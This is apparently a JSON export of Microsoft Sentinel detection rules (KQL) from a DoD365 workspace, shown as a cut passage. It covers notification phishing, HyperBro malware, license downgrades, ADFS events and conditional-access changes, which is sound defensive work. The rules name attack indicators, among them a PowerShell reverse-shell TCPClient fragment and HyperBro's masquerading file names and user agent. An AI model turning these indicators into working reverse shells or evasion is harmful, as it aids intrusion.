where TimeGenerated >= ago(1d)\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n);\nDeviceProcessEvents\n| where ProcessCommandLine contains \"--notification\"\n| where not (ProcessCommandLine endswith @\"chrome://settings/security?q=enhanced|TailoredSecurityUnconsentedPromotionNotification\") // defeat for safe browsing blocks\n| extend notification_split = split(ProcessCommandLine, \"=\")\n| extend notification_cmd = split(notification_split[1], \"|\")\n| extend notification_source = notification_cmd[-2]\n| where isnotempty(notification_source)\n| extend urlinfo = extract_all(tld_regex, dynamic(['tld']),tostring(notification_source))\n| where not (urlinfo has_any (\"mil\",\"us\"))\n| extend notification_id = notification_cmd[-1]\n| where (notification_source has_any(maliciousurllist)) or (notification_cmd has_any(maliciousurllist))\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n| project UserPrincipalName, DeviceName, InitiatingProcessAccountUpn, ActionType ,notification_source, notification_id","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"notification_source"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1189"],"displayName":"BAH_browser_notification_adware_phishing","enabled":true,"description":"Looks for notifications coming from uncommon domains that could be an attempt to phish a user using the Windows toast notification service. Has a chance to provide false alarms, domains detected should be reviewed.\nPLATFORM:Windows\nMITRE:TA0001;T1189","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:44:54.7967487Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/e7f12b25-ab14-42a4-92a9-44f3eaf82bb9","name":"e7f12b25-ab14-42a4-92a9-44f3eaf82bb9","etag":"\"87002ada-0000-2700-0000-66fdca230000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT30M","queryPeriod":"PT30M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Robert Russell\r\n// Description: This analytic detects activity related to HyperBro detailed in the CISA report at the following link\r\n// https://www.cisa.gov/uscert/ncas/analysis-reports/ar22-277b\r\n// According to CISA \"CISA analyzed 4 files associated with HyperBro malware. The files creates a backdoor program that is capable of uploading and downloading files to and from the system. The RAT is also capable of logging keystrokes and executing commands on the system.\"\r\n// The following analytic detects 4 different behaviors related to HyperBro\r\n// 1 HyperBro User Agent signature\r\n// 2 HyperBro registry behavior\r\n// 3 HyperBro process behavior\r\n// 4 HyperBro network behavior\r\n// MITRE Tactics\r\n// T1543.003 Persistence\r\n// T1574.002 Hijack Execution Flow\r\n// T1567.000 Exfiltration\r\n// T1560.000 Collection\r\n// False Positives: The registry, process, and network behavior are fairly specific and should not produce false positives. The user agent activity could produce false positives and when seen without other Hyperbro related activity should be considered a false positive. As of 12/20/2022 this user agent was not seen in the MDE data available.\r\nlet signInLookup = ( // used with MDE device logs to get last signed in user for a device\r\nSigninLogs \r\n| where TimeGenerated >= ago(1d)\r\n| where DeviceDetail contains \"displayName\"\r\n| extend DeviceDetailJson = parse_json(DeviceDetail)\r\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\r\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\r\n);\r\n(union isfuzzy=True\r\n    (\r\n        (union isfuzzy=True // Behavior 1 user agent activity\r\n            (\r\n            OfficeActivity\r\n            | where isnotempty(UserAgent) and UserAgent startswith \"Mozilla/5.0\" // looks for non empty UAs and ones that start with Mozilla/5.0\r\n            | extend UserAgent = iif(UserAgent contains '%', url_decode(UserAgent), UserAgent) // If it contiains a percent attempt ot url decode it\r\n            | where UserAgent == @\"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36\"\r\n            | project UserPrincipalName = UserId, UserAgent, Note=\"HyperBro User Agent Activity\"\r\n            ),\r\n            (\r\n            SigninLogs\r\n            | where isnotempty(UserAgent) and UserAgent startswith \"Mozilla/5.0\" // looks for non empty UAs and ones that start with Mozilla/5.0\r\n            | extend UserAgent = iif(UserAgent contains '%', url_decode(UserAgent), UserAgent) // If it contiains a percent attempt ot url decode it\r\n            | where UserAgent == @\"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36\"\r\n            | project UserPrincipalName, UserAgent, Note=\"HyperBro User Agent Activity\"\r\n            )\r\n        )\r\n    ),\r\n    (\r\n    DeviceRegistryEvents // Behavior 2 registry activity\r\n    | where ActionType has_any (\"RegistryKeyCreated\",\"RegistryValueSet\")\r\n    | where RegistryKey contains \"windefenders\"\r\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n    | project UserPrincipalName, DeviceName, RegistryKey, Note=\"HyperBro Registry Activity\"\r\n    ),\r\n    (\r\n    DeviceProcessEvents // Behavior 3 process activity\r\n    | where FolderPath has_any (\"msmpeng.exe\", \"mpsvc.dll\") and not (FolderPath has_any (@\"\\Program Files\\Windows Defender\\\", @\"\\ProgramData\\Microsoft\\Windows Defender\\\"))\r\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n    | project UserPrincipalName, DeviceName, FolderPath, Note=\"HyperBro Process Activity\"\r\n    ),\r\n    (\r\n    DeviceNetworkEvents // Behavior 3 network activity\r\n    | where InitiatingProcessFileName has_any (\"msmpeng.exe\", \"mpsvc.dll\") and not (InitiatingProcessFolderPath has_any (@\"\\Program Files\\Windows Defender\\\", @\"\\ProgramData\\Microsoft\\Windows Defender\\\"))\r\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n    | project UserPrincipalName, DeviceName, InitiatingProcessFileName, RemoteIP, RemotePort, RemoteUrl, Note=\"HyperBro Network Activity\"\r\n    )\r\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserPrincipalName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"RemoteIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Collection","Exfiltration","Persistence"],"techniques":["T1560","T1567","T1543","T1574"],"displayName":"BAH_HyperBro","enabled":true,"description":"Looks for HyperBro malware activity based on the following CISA article\nhttps://www.cisa.gov/uscert/ncas/analysis-reports/ar22-277b\nPLATFORM:Windows\nMITRE:TA0003;T1543;T1574,TA0009;T1560,TA0010;T1567","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:33:03.1013452Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/3aa508ba-c4ce-4a8d-9814-edb1951f0c9c","name":"3aa508ba-c4ce-4a8d-9814-edb1951f0c9c","etag":"\"8700b6ce-0000-2700-0000-66fdc94d0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Rob Russell\n//Description: Office 365 E5 licenses come with enhanced telemetry that allows for advanced threat detection. This analytic looks for licenses being downgraded from E5 as it could be a sign of an attacker attempting to avoid detection.\n// This analytic extracts SKU data from the additional data field of audit logs and looks for the removal of E5 licenses or licenses with enhanced security features.\n//References\n//https://www.microsoft.com/en-us/microsoft-365/enterprise/compare-office-365-plans?\n//https://www.inversecos.com/2021/09/office365-attacks-bypassing-mfa.html\n//https://www.csoonline.com/article/3628330/the-most-dangerous-and-interesting-microsoft-365-attacks.html\n//working with audit log license data\n//http://practical365.com/why-microsoft-365-audit-logs-lack-proper-fit-and-finish/\n// test log on TI with srowley@dod365ti.onmicrosoft.us at around 3:06pm on 4 April 2022\n// False Positives: Changes to licenses names or unknown licenses that support E5 or G5 features could trigger this alert. \nlet whiteListUsers = dynamic([\"initiatedByUser@toIgnore.com\"]); // add users here you do NOT want to monitor\nlet protectedE5SKU = dynamic([\"EMSPREMIUM_USGOV_DOD\", \n\"ENTERPRISEPREMIUM_NOPSTNCONF_USGOV_DOD\", \n\"Microsoft_365_G5_FOR_DOD_USGOV_DOD\",\n\"IDENTITY_THREAT_PROTECTION_AR_USGOV_DOD\"]); //list of SKUs that employ E5 security enhancements\nAuditLogs\n| where Result == \"success\"\n| where TargetResources has \"SkuName\"\n| extend initiatedByUser = parse_json(InitiatedBy).user.userPrincipalName\n| extend TargetResourcesJSON = parse_json(TargetResources[0])\n| extend TargetName = TargetResourcesJSON.displayName\n| extend licenseDataType = TargetResourcesJSON.type\n| extend licenseDataUPN = TargetResourcesJSON.userPrincipalName\n| mv-expand TargetResourcesJSON.modifiedProperties\n| extend modPropDisplayName = tostring(TargetResourcesJSON_modifiedProperties.displayName)\n| extend modPropDisplayNewValue = tostring(TargetResourcesJSON_modifiedProperties.newValue)\n| extend modPropDisplayOldValue = tostring(TargetResourcesJSON_modifiedProperties.oldValue)\n| where modPropDisplayName in (\"AssignedLicense\", \"GroupLicenseAssignment\")\n| extend oldSKUs = extract_all(@'(?:SkuName=)(?P<value>\\w+)', modPropDisplayOldValue)\n| extend newSKUs = extract_all(@'(?:SkuName=)(?P<value>\\w+)', modPropDisplayNewValue)\n| where isnotempty(newSKUs) and isnotempty(oldSKUs)\n| where (oldSKUs has_any (protectedE5SKU)) and not(newSKUs has_any (protectedE5SKU))| project\n    TimestampCustomEntity = TimeGenerated,\n    initiatedByUser,\n    TargetName,\n    OperationName,\n    Result,\n    licenseDataUPN,\n    licenseDataType,\n    oldSKUs,\n    newSKUs","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"TargetName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1562"],"displayName":"BAH_License_Downgrade","enabled":true,"description":"Office 365 E5 licenses com with enhanced telemetry that allows for advanced threat detection. This analytic looks for licenses being downgraded from E5 as it could be a sign of an attacker attempting to avoid detection.\nPLATFORM:Windows\nMITRE:TA0005;T1562","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:29:32.4504425Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/18246141-7416-4575-acaa-fd46be1e0e21","name":"18246141-7416-4575-acaa-fd46be1e0e21","etag":"\"17002b32-0000-2700-0000-63c816e20000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT15M","queryPeriod":"PT15M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"SecurityEvent\n| where EventSourceName matches regex \"AD FS Auditing\" and EventID == 1007\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","Exfiltration","CredentialAccess"],"techniques":[],"displayName":"DoD365-J - ADFS Certificate export","enabled":false,"description":"By default exporting a certificate from ADFS will generate an event with eventID 1007 in the Microsoft-Windows-CertificateServicesClient-Lifecycle-System Windows Event Log. The extraction of a certificate is often part of attempts by attackers to subvert federated security setups and this event should be very carefully examined.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T15:57:22.769803Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/0fd320e0-30f4-4481-976b-21ae99ec1340","name":"0fd320e0-30f4-4481-976b-21ae99ec1340","etag":"\"1700c277-0000-2700-0000-63c81dd90000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"OfficeActivity\r\n| where Operation contains \"SafeAttachment\"\r\n| extend Actor = UserId\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":[],"displayName":"DoD365-J - SafeAttachments Policy Modified","enabled":false,"description":"","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:27:05.0689243Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/9653b872-1f26-4f6b-986b-bd5d635a7a3d","name":"9653b872-1f26-4f6b-986b-bd5d635a7a3d","etag":"\"17008470-0000-2700-0000-63c81d0c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"OfficeActivity\n| where Operation == \"MailboxLogin\"\n| where ClientInfoString == \"Client=Microsoft.Exchange.Powershell; Microsoft WinRM Client\"\n| summarize count(), min(TimeGenerated), max(TimeGenerated)\n    by\n    Operation,\n    OrganizationName,\n    UserType,\n    UserId,\n    MailboxOwnerUPN,\n    Logon_Type,\n    ClientInfoString\n| extend timestamp = min_TimeGenerated, AccountCustomEntity = UserId\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","DefenseEvasion","CredentialAccess"],"techniques":[],"displayName":"DoD365-J - PowerShell-Non-BrowserMailboxLoginActivity","enabled":false,"description":"","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:23:40.8131416Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/55f2cad6-4b80-4dbf-bbad-f653c84609af","name":"55f2cad6-4b80-4dbf-bbad-f653c84609af","etag":"\"46008044-0000-2700-0000-63d131f10000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"// Azure AD Conditional Access Policy Modified or Deleted\n// Enchances analytic with newConditions, oldValue, oldConditions, and users (applied).\nAuditLogs\n| where Category == \"Policy\"\n| where OperationName == \"Update conditional access policy\" or OperationName == \"Delete conditional access policy\"\n    or OperationName == \"Add conditional access policy\"\n| where TargetResources[0].displayName != \"Default Policy\"\n| extend value = tostring(parse_json(TargetResources)[0].modifiedProperties)\n| extend newValue = tostring(parse_json(value)[0].newValue)\n| extend newConditions = tostring(parse_json(newValue).conditions)\n| extend users = tostring(parse_json(newConditions).users)\n| extend newExcludedGroups = tostring(parse_json(users).excludeGroups)\n| extend oldValue = tostring(parse_json(value)[0].oldValue)\n| extend oldConditions = tostring(parse_json(oldValue).conditions)\n| extend oldUsers = tostring(parse_json(oldConditions).users)\n| extend oldExcludedGroups = tostring(parse_json(oldUsers).excludeGroups)\n| extend CApolicy = tostring(parse_json(TargetResources)[0].displayName)\n| extend UPN = InitiatedBy.user.userPrincipalName\n| project\n    ActivityDateTime,\n    TimeGenerated,\n    ActivityDisplayName,\n    UPN,\n    TargetResources[0].displayName,\n    newConditions,\n    users,\n    oldValue,\n    oldConditions","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UPN"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"TargetResources_0_displayName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"ActivityDisplayName"}]}],"eventGroupingSettings":{"aggregationKind":"AlertPerResult"},"tactics":["DefenseEvasion","InitialAccess","Impact"],"techniques":[],"displayName":"DoD365-J - Azure AD Conditional Access Policy Modified or Deleted","enabled":false,"description":"Rule to determine if changes were made to CA policies.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-25T13:43:13.7194163Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ff6970f4-41df-48bf-8ad2-4dbd5483f35e","name":"ff6970f4-41df-48bf-8ad2-4dbd5483f35e","etag":"\"1700514d-0000-2700-0000-63c819610000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"SecurityEvent\n| where EventSourceName matches regex \"AD FS Auditing\" and EventID == 4882\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"DoD365-J - ADFS security permissions for Certificate Services changed.","enabled":false,"description":"The security permissions for Certificate Services changed. Monitoring for this eventID is recommended by Microsoft https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:08:01.182521Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/d81f9717-c2c2-4176-8b05-ebbf38ba7cbc","name":"d81f9717-c2c2-4176-8b05-ebbf38ba7cbc","etag":"\"17003e6e-0000-2700-0000-63c81ccb0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT12H","queryPeriod":"PT12H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"SecurityEvent\n| where EventID == 4688\n| where Process has_any (\"powershell.exe\", \"PowerShell_ISE.exe\", \"cmd.exe\")\n| where CommandLine has \"$client = New-Object System.Net.Sockets.TCPClient\"\n| extend\n    timestamp = TimeGenerated,\n    AccountCustomEntity = Account,\n    HostCustomEntity = Computer,\n    IPCustomEntity = IpAddress\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IpAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CommandAndControl","Exfiltration"],"techniques":[],"displayName":"DoD365-J - PowerShell Reverse Shell Detected","enabled":false,"description":"Invoke-PowerShellTcpOneLine is a PowerShell script to create a simple and small reverse shell. It can be abused by attackers to exfiltrate data. This query looks for command line activity similar to Invoke-PowerShellTcpOneLine.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:22:35.3086166Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/f1751939-591d-46f0-a792-ce4b19ec702d","name":"f1751939-591d-46f0-a792-ce4b19ec702d","etag":"\"1700f25a-0000-2700-0000-63c81aca0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"SecurityEvent\n| where EventSourceName matches regex \"AD FS Auditing\" and EventID == 4794\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"DoD365-J - An attempt was made to set the Directory Services Restore Mode (ADFS)","enabled":false,"description":"An attempt was made to set the Directory Services Restore Mode. Monitoring for this eventID is recommended by Microsoft https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:14:02.6894418Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ae2af5c8-90d1-4170-a756-35619c28f465","name":"ae2af5c8-90d1-4170-a756-35619c28f465","etag":"\"1700715c-0000-2700-0000-63c81af30000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"AuditLogs\r\n| where ActivityDisplayName contains \"policy\" and TargetResources contains \"MFA\"  \r\n| extend timestamp = TimeGenerated\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"ActivityDisplayName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":[],"displayName":"DoD365-J - Azure MFA Conditional Access Policy Modification","enabled":false,"description":"","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:14:42.9508325Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/c8ad3682-4072-4f9c-ac7e-68734ed4400d","name":"c8ad3682-4072-4f9c-ac7e-68734ed4400d","etag":"\"1600c0d4-0000-2700-0000-63c80d680000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":3,"severity":"Medium","query":"SigninLogs\n| where ResultType == \"500121\"\n| where Status.additionalDetails == \"MFA denied; invalid verification code\"\n| extend additionalDetails_ = tostring(Status.additionalDetails)\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","CredentialAccess"],"techniques":[],"displayName":"DoD365-J - Potential Azure MFA Brute Force","enabled":false,"description":"This alert was disabled on 30-SEP-2021 by Shea Fitzpatrick.\nReasons for disabling:\n- Query logic is agnostic of brute force target and fires an alert if there are more than three failed MFA pin attempts in an hour. So if there are four or more records of an incorrect MFA pin from four unique users this alert will falsely report a brute force attempt\n- There is a rule that already captures various types brute force attempts including MFA pin attempts.\n            - Brute force attack against Azure Portal (252e3d24-ca72-41d5-b86d-8b0933f187a3)\n\n.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T15:16:56.7520945Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/fce040ca-2144-4c38-afa9-4c980695f675","name":"fce040ca-2144-4c38-afa9-4c980695f675","etag":"\"1700c162-0000-2700-0000-63c81b9a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT15M","queryPeriod":"PT15M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"SecurityAlert\r\n| where ProviderName == 'MCAS'\r\n| extend timestamp = TimeGenerated, AccountCustomEntity = ProviderName, TagCustomEntity = AlertName\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"DisplayName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"DoD365-J - Cloud42 MCAS Alerts","enabled":false,"description":"Pulls in MCAS alerts from Cloud42","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:17:30.1009614Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/e47c9712-6bc4-409e-9df5-bbe435eacaff","name":"e47c9712-6bc4-409e-9df5-bbe435eacaff","etag":"\"160054ec-0000-2700-0000-63c8101c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"AuditLogs\n| where ActivityDisplayName has \"Update policy\"\n| where TargetResources[0].displayName != 'Default Policy'\n| project TimeGenerated, ActivityDisplayName, InitiatedBy.user.userPrincipalName, TargetResources[0].displayName\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatedBy_user_userPrincipalName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"TargetResources_0_displayName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1484"],"displayName":"DoD365-J - Azure AD Conditional Access Policy 